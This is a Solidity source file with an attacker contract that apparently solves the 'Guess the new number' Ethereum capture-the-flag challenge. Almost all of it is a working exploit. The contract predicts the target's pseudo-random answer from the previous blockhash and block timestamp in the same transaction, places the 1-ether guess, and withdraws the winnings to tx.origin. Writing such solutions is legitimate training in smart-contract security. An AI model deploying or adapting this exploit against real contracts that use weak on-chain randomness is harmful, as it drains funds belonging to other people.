// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IGuessTheNewNumberChallenge {

    function guess(uint8 n) external payable;
    function isComplete() external view returns (bool);
}

contract GuessTheNewNumberAttacker{

    function attack(address _destination) external payable{
        require(address(this).balance >= 1 ether);

        uint8 calculatedAnswer = uint8(
            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
            ));

        IGuessTheNewNumberChallenge(_destination).guess{value: 1 ether}(calculatedAnswer);

        require(IGuessTheNewNumberChallenge(_destination).isComplete(), "!completed");
        // Transfer back all the funds to the user
        (bool withdrawn, ) = payable(tx.origin).call{value: address(this).balance}("");
        require(withdrawn,  "!withdrawn");

    }

    receive() external payable {}

}